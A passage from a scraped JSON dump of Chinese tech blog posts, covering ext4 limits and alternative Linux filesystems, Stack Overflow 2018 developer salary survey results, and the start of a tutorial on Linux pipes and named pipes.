的元数据校验和的功能非常弱。但它总比没有好。虽然校验 <strong>所有的事情</strong> 都听起来很简单！—— 事实上，将校验和与文件系统连接到一起有一些重大的挑战；请参阅<a href=\"https://ext4.wiki.kernel.org/index.php/Ext4_Metadata_Checksums\">设计文档</a>了解详细信息。</p>\n<h4 id=\"toc_22\">一流的配额支持</h4>\n<p>等等，配额？！从 ext2 出现的那天开始我们就有了这些！是的，但它们一直都是事后的添加的东西，而且它们总是犯傻。这里可能不值得详细介绍，但<a href=\"https://ext4.wiki.kernel.org/index.php/Design_For_1st_Class_Quota_in_Ext4\">设计文档</a>列出了配额将从用户空间移动到内核中的方式，并且能够更加正确和高效地执行。</p>\n<h4 id=\"toc_23\">大分配块</h4>\n<p>随着时间的推移，那些讨厌的存储系统不断变得越来越大。由于一些固态硬盘已经使用 8K 硬件块大小，因此 ext4 对 4K 模块的当前限制越来越受到限制。较大的存储块可以显著减少碎片并提高性能，代价是增加“松弛”空间（当你只需要块的一部分来存储文件或文件的最后一块时留下的空间）。</p>\n<p>你可以在<a href=\"https://ext4.wiki.kernel.org/index.php/Design_for_Large_Allocation_Blocks\">设计文档</a>中查看详细说明。</p>\n<h3 id=\"toc_24\">ext4 的实际限制</h3>\n<p>ext4 是一个健壮、稳定的文件系统。如今大多数人都应该在用它作为根文件系统，但它无法处理所有需求。让我们简单地谈谈你不应该期待的一些事情 —— 现在或可能在未来：</p>\n<p>虽然 ext4 可以处理高达 1 EiB 大小（相当于 1,000,000 TiB）大小的数据，但你 <em>真的</em> 不应该尝试这样做。除了能够记住更多块的地址之外，还存在规模上的问题。并且现在 ext4 不会处理（并且可能永远不会）超过 50-100 TiB 的数据。</p>\n<p>ext4 也不足以保证数据的完整性。随着日志记录的重大进展又回到了 ext3 的那个时候，它并未涵盖数据损坏的许多常见原因。如果数据已经在磁盘上被<a href=\"https://en.wikipedia.org/wiki/Data_degradation#Visual_example_of_data_degradation\">破坏</a> —— 由于故障硬件，宇宙射线的影响（是的，真的），或者只是数据随时间衰减 —— ext4 无法检测或修复这种损坏。</p>\n<p>基于上面两点，ext4 只是一个纯 <em>文件系统</em>，而不是存储卷管理器。这意味着，即使你有多个磁盘 —— 也就是奇偶校验或冗余，理论上你可以从 ext4 中恢复损坏的数据，但无法知道使用它是否对你有利。虽然理论上可以在不同的层中分离文件系统和存储卷管理系统而不会丢失自动损坏检测和修复功能，但这不是当前存储系统的设计方式，并且它将给新设计带来重大挑战。</p>\n<h3 id=\"toc_25\">备用文件系统</h3>\n<p>在我们开始之前，提醒一句：要非常小心，没有任何备用的文件系统作为主线内核的一部分而内置和直接支持！</p>\n<p>即使一个文件系统是 <em>安全的</em>，如果在内核升级期间出现问题，使用它作为根文件系统也是非常可怕的。如果你没有充分的理由通过一个 chroot 去使用替代介质引导，耐心地操作内核模块、grub 配置和 DKMS……不要在一个很重要的系统中去掉预留的根文件。</p>\n<p>可能有充分的理由使用你的发行版不直接支持的文件系统 —— 但如果你这样做，我强烈建议你在系统启动并可用后再安装它。（例如，你可能有一个 ext4 根文件系统，但是将大部分数据存储在 ZFS 或 Btrfs 池中。）</p>\n<h4 id=\"toc_26\">XFS</h4>\n<p>XFS 与非 ext 文件系统在 Linux 中的主线中的地位一样。它是一个 64 位的日志文件系统，自 2001 年以来内置于 Linux 内核中，为大型文件系统和高度并发性提供了高性能（即大量的进程都会立即写入文件系统）。</p>\n<p>从 RHEL 7 开始，XFS 成为 Red Hat Enterprise Linux 的默认文件系统。对于家庭或小型企业用户来说，它仍然有一些缺点 —— 最值得注意的是，重新调整现有 XFS 文件系统是一件非常痛苦的事情，不如创建另一个并复制数据更有意义。</p>\n<p>虽然 XFS 是稳定的且是高性能的，但它和 ext4 之间没有足够具体的最终用途差异，以值得推荐在非默认（如 RHEL7）的任何地方使用它，除非它解决了对 ext4 的特定问题，例如大于 50 TiB 容量的文件系统。</p>\n<p>XFS 在任何方面都不是 ZFS、Btrfs 甚至 WAFL（一个专有的 SAN 文件系统）的“下一代”文件系统。就像 ext4 一样，它应该被视为一种更好的方式的权宜之计。</p>\n<h4 id=\"toc_27\">ZFS</h4>\n<p>ZFS 由 Sun Microsystems 开发，以 zettabyte 命名 —— 相当于 1 万亿 GB —— 因为它理论上可以解决大型存储系统。</p>\n<p>作为真正的下一代文件系统，ZFS 提供卷管理（能够在单个文件系统中处理多个单独的存储设备），块级加密校验和（允许以极高的准确率检测数据损坏），<a href=\"https://en.wikipedia.org/wiki/Data_degradation#Visual_example_of_data_degradation\">自动损坏修复</a>（其中冗余或奇偶校验存储可用），<a href=\"https://arstechnica.com/information-technology/2015/12/rsync-net-zfs-replication-to-the-cloud-is-finally-here-and-its-fast/\">快速异步增量复制</a>，内联压缩等，<a href=\"https://arstechnica.com/information-technology/2014/02/ars-walkthrough-using-the-zfs-next-gen-filesystem-on-linux/\">以及更多</a>。</p>\n<p>从 Linux 用户的角度来看，ZFS 的最大问题是许可证问题。ZFS 许可证是 CDDL 许可证，这是一种与 GPL 冲突的半许可的许可证。关于在 Linux 内核中使用 ZFS 的意义存在很多争议，其争议范围从“它是 GPL 违规”到“它是 CDDL 违规”到“它完全没问题，它还没有在法庭上进行过测试。”最值得注意的是，自 2016 年以来 Canonical 已将 ZFS 代码内联在其默认内核中，而且目前尚无法律挑战。</p>\n<p>此时，即使我作为一个非常狂热于 ZFS 的用户，我也不建议将 ZFS 作为 Linux 的根文件系统。如果你想在 Linux 上利用 ZFS 的优势，用 ext4 设置一个小的根文件系统，然后将 ZFS 用在你剩余的存储上，把数据、应用程序以及你喜欢的东西放在它上面 —— 但把 root 分区保留在 ext4 上，直到你的发行版明确支持 ZFS 根目录。</p>\n<h4 id=\"toc_28\">Btrfs</h4>\n<p>Btrfs 是 B-Tree Filesystem 的简称，通常发音为 “butter” —— 由 Chris Mason 于 2007 年在 Oracle 任职期间发布。Btrfs 旨在跟 ZFS 有大部分相同的目标，提供多种设备管理、每块校验、异步复制、直列压缩等，<a href=\"https://arstechnica.com/information-technology/2014/01/bitrot-and-atomic-cows-inside-next-gen-filesystems/\">还有更多</a>。</p>\n<p>截至 2018 年，Btrfs 相当稳定，可用作标准的单磁盘文件系统，但可能不应该依赖于卷管理器。与许多常见用例中的 ext4、XFS 或 ZFS 相比，它存在严重的性能问题，其下一代功能 —— 复制、多磁盘拓扑和快照管理 —— 可能非常多，其结果可能是从灾难性地性能降低到实际数据的丢失。</p>\n<p>Btrfs 的维持状态是有争议的；SUSE Enterprise Linux 在 2015 年采用它作为默认文件系统，而 Red Hat 于 2017 年宣布它从 RHEL 7.4 开始不再支持 Btrfs。可能值得注意的是，该产品支持 Btrfs 部署用作单磁盘文件系统，而不是像 ZFS 中的多磁盘卷管理器，甚至 Synology 在它的存储设备使用 Btrfs，但是它在传统 Linux 内核 RAID（mdraid）之上分层来管理磁盘。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114377\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114377votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114377\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/8141690b03d35ed04679c81e69d075e736fd8883.jpg"}
{"title": "哪门编程语言更赚钱？看看 Stack Overflow 的最新调查", "url": "http://blog.jobbole.com/114388/", "create_date": "2018/09/16", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/1d66c6135be63e71744b3b8ec59f5545.jpg"], "url_object_id": "057d5fe32f55928edb6d8faab623e092", "praise_nums": 2, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,编程语言", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.oschina.net/news/99994/developer-salaries-in-2018-sf-salary-calculator\">开源中国社区</a>   </div><p>Stack Overflow 2018 年最新的薪资计算器已正式推出。最新的计算器除了增加新的国家和地区之外，还更新了数字数据。更新后的薪资计算器新增了 8 个国家和地区的数据，以及更能反映开发者收入的最新数据。</p>\n<p>所以，想知道自己的技术能力值多少钱？不妨试用一下 Stack Overflow 2018 年最新的薪资计算器(<a href=\"https://stackoverflow.com/jobs/salary\" target=\"_blank\">https://stackoverflow.com/jobs/salary</a>)。通过最新的计算器，我们可以看到目前哪些工作岗位在如火如荼地发展着，哪些工作岗位正在走下坡路，而哪些城市的技术从业者收入最高。</p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/8d578b765aedb88b8fa25bf207b81abd.png\" alt=\"\"><br>\n<em>薪资计算器的统计维度：坐标、教育程度、编码年龄、所属岗位以及专业擅长的技能</em></p>\n<p>不难发现，与 2017 年相比，开发者的收入整体有所增加。其中，在伦敦和旧金山等技术较为发达的地区，薪资中位数较 2017 年平均上涨约 25%。由此看来，今年的技术市场还是很乐观的。</p>\n<p>而收入最高的职位 —— DevOps 专家在多个国家都是稳坐第一（美国、德国、印度和英国）。DevOps 专家是收入最高的开发者。美国 DevOps 专家的年薪中位数接近 10 万美元。其他最高收入的职位是数据科学家、后端开发者、移动开发者、游戏或图形开发者以及全栈开发者。与此同时，所有国家和地区薪水垫底的职位都是设计人员和数据库管理员。</p>\n<p>下面来说一下开发者最关心的语言问题，究竟哪门编程语言最受雇主青睐呢？值得各位关注的是，Go 语言开发者成了高收入者。要知道，Go 目前还不是流行的编程语言，企业仍倾向于使用更成熟的旧语言。在二十五种最常用的语言中，Java 是使用最为广泛的语言，而 JavaScript 占据了第二位。新进者 Go 语言位居第 20 位，Scala 位居第 19 位。</p>\n<p>薪资计算器中的数字也可以与 Stack Overflow 2018 问卷调查中的高薪技术清单进行比较，其中 Scala 和 Go 语言在列表中的位置相对较高。</p>\n<p>下面大家继续看看 Stack Overflow 2018 调查的相关内容：</p>\n<h3><strong>全球职业占比</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/643b6221042e5243602256becab75bf4.png\" width=\"673\" height=\"370\"></p>\n<p>在职业占比的调查中，我们发现，前三分别是：后端开发、全栈开发和前端开发。有近 60% 的受访者将自己视为后端开发，大约 20％ 的受访者认为自己是移动开发。</p>\n<h3><strong>对开源的贡献</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/57ff5a122f24b2317ae7b3a54dc2a1fd.png\" width=\"698\" height=\"170\"></p>\n<p>Stack Overflow 上几乎有一半的专业开发人员参与了开源项目。 参与开源的方式因语言而异。 超过 70％ 的使用 Rust，Julia 和 Clojure 的开发人员参与开源，而使用 VBA，VB.NET 和 C＃的开发人员中只有不到 40％。</p>\n<h3><strong>码龄</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/910499427e2bcd10724876ef67815d4d.png\" width=\"630\" height=\"424\"></p>\n<p>超过一半的受访者拥有五以内的专业编码经验。 使用 Cobol 和 Perl 等语言的开发人员编码经验最丰富，而使用 Matlab，Haskell 和 Kotlin 等则相反。</p>\n<h3><strong>不同开发领域的开发经验</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a91fc939fb8f30ed0b98772222b306e3.png\" width=\"682\" height=\"572\"></p>\n<p>在不同软件开发领域工作的开发人员具有不同的工作经验。 调查发现，DevOps 专家和开发人员拥有最丰富的开发经验。 DevOps 作为一门学科和专业身份相对较新，但在这一领域工作的人员经验丰富。 游戏/图形开发人员和移动开发人员拥有最少的经验。</p>\n<h3><strong>起床时间</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c6108725a11391beb964a3956bc69e70.png\" width=\"684\" height=\"418\"></p>\n<p>有的开发者可能准时下班到家，有点可能加班到深夜，有的可能天亮才躺在床上。不管什么情况，大多数开发者表示他们一般是 8 点起床。</p>\n<h3><strong>敲电脑的时间</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e3d9288791e3eab2c741d527e50d7de9.png\" width=\"631\" height=\"185\"></p>\n<p>受访者包括专业开发人员、学生和业余爱好者，他们中的绝大多数表示，醒着的大部分时间都待在电脑旁。</p>\n<h3><strong>生活习惯</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/4b64f1d64b73d2f13c72c7a873dee3cd.png\" width=\"689\" height=\"243\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/53d439c741e24182ebf3bed38e3a9567.png\" width=\"690\" height=\"239\"></p>\n<p>调查显示，开发者在饮食方面比较规律，64% 的开发者都会按时吃饭。在锻炼情况方面，超过 60％ 的受访者表示至少每周锻炼一次，但从整体分布来看，从不锻炼的开发者占比也不少。</p>\n<h3><strong>开发语言</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/b90d6d468c2d6e1f4ce56a37b91b14e2.png\" width=\"611\" height=\"571\"></p>\n<p>JavaScript 连续六年成为最常用的编程语言。 Python 在今年的排名上升，超过 C＃，就像去年超过 PHP 一样。 Python 也成为今年增长最快的编程语言。</p>\n<h3><strong>最受开发者喜爱的语言</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/549cb0a5331d719567b2f54cc29dc446.png\" width=\"620\" height=\"488\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e272fb55e52142336f9db16c5a62361f.png\" width=\"620\" height=\"398\"></p>\n<h3><strong>最想尝试的语言</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/71832893840ebf0d8aa4029b393bf1b1.png\" width=\"619\" height=\"496\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/41c57c09d1e27c8ecdcc265e9bd79ed2.png\" width=\"620\" height=\"373\"></p>\n<h3><strong>语言对应薪资</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/b86d7e6c38f35999c89d97a0a69919f3.png\" width=\"568\" height=\"603\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e5f08b4cd0d24fa897c2a66e20167d2f.png\" width=\"507\" height=\"287\"></p>\n<p>在<strong>受欢迎</strong>的几门编程语言中，<strong>Go 语言开发者的薪资处于较高水平</strong>。</p>\n<h3><strong>框架库和工具</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ff8996962bef3e02c8bfb5d90fa10a63.png\" width=\"558\" height=\"435\"></p>\n<p>Node.js 和 AngularJS 仍然是此类别中最常用的技术，React 和 .Net Core 对许多开发人员来说也很重要。</p>\n<h3><strong>数据库</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ad78333eed1dd0513f9fc074eafe67bb.png\" width=\"692\" height=\"523\"></p>\n<h3><strong>桌面/服务器使用率</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/fb4eba1c5da7b5332b01f9a9fe2c9d12.png\" width=\"677\" height=\"527\"></p>\n<h3><strong>最受喜爱的桌面/服务器</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e594c6f1810575403325b628568d65de.png\" width=\"694\" height=\"506\"></p>\n<h3><strong>最受欢迎的开发环境</strong></h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f2f083547fc32c5f47a299002b8b66b8.png\" width=\"650\" height=\"593\"></p>\n<p>由于很多调查的调查结果与中国国内情况不太相符，或存在一定偏差，使得国内开发者怀疑，这些个调查到底有没有把中国考虑在内。对此，小编专门看了一眼调查发布图：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e890248d690aa13ae8da40a25e3acd0d.png\" width=\"702\" height=\"386\"></p>\n<p>主要大头集中在美国和印度地区，中国调查占比 1.0%。emmm… 事实证明，中国的确是有考虑在内的，由于占比偏低，最终结果可能存在偏差，以下调查结果仅供参考，如有异议欢迎留言分享！</p>\n<p>详情请参考 <a href=\"https://insights.stackoverflow.com/survey/2018#top-paying-technologies\">Stack Overflow</a> 的调查。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114388\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114388votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114388\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/f91b50cabfac3ffddce3fd3f9459483f457d2ea9.jpg"}
{"title": "介绍 Linux 中的管道和命名管道", "url": "http://blog.jobbole.com/114379/", "create_date": "2018/09/12", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a836f3cdf91cb1dcf551a3cd4f561da6.jpg"], "url_object_id": "2d95df178a71676ecda57cd49c56d36f", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/8/introduction-pipes-linux\">Archit Modi</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9992-1.html\">Linux中国/geekpi</a>   </div><blockquote><p>要在命令间移动数据？使用管道可使此过程便捷。</p></blockquote>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a836f3cdf91cb1dcf551a3cd4f561da6.jpg\"></p>\n<p>在 Linux 中，<code>pipe</code> 能让你将一个命令的输出发送给另一个命令。管道，如它的名称那样，能重定向一个进程的标准输出、输入和错误到另一个进程，以便于进一步处理。</p>\n<p>“管道”（或称“未命名管道”）命令的语法是在两个命令之间加上 <code>|</code> 字符：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67025e5d6173499054\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCommand-1 | Command-2 | ...| Command-N</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67025e5d6173499054-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67025e5d6173499054-1\"><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">N</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这里，该管道不能通过另一个会话访问；它被临时创建用于接收 <code>Command-1</code> 的执行并重定向标准输出。它在成功执行之后删除。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/49dba0a934014ce2131193852491b64b.png\" alt=\"\"></p>\n<p>在上面的示例中，<code>contents.txt</code> 包含特定目录中所有文件的列表 —— 具体来说，就是 <code>ls -al</code> 命令的输出。我们首先通过管道（如图所示）使用 “file” 关键字从 <code>contents.txt</code> 中 <code>grep</code> 文件名，因此 <code>cat</code> 命令的输出作为 <code>grep</code> 命令的输入提供。接下来，我们添加管道来执行 <code>awk</code> 命令，该命令显示 <code>grep</code> 命令的过滤输出中的第 9 列。我们还可以使用 <code>wc -l</code> 命令计算 <code>contents.txt</code> 中的行数。</p>\n<p>只要系统启动并运行或直到它被删除，命名管道就可以持续使用。它是一个遵循 <a href=\"https://en.wikipedia.org/wiki/FIFO_(computing_and_electronics)\">FIFO</a>（先进先出）机制的特殊文件。它可以像普通文件一样使用。也就是，你可以写入，从中读取，然后打开或关闭它。要创建命名管道，命令为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67025e5e0477254649\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkfifo &lt;pipe-name&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67025e5e0477254649-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67025e5e0477254649-1\"><span class=\"crayon-v\">mkfifo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">pipe</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这将创建一个命名管道文件，它甚至可以在多个 shell 会话中使用。</p>\n<p>创建 FIFO 命名管道的另一种方法是使用此命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67025e5e4629529093\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmknod p &lt;pipe-name&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" 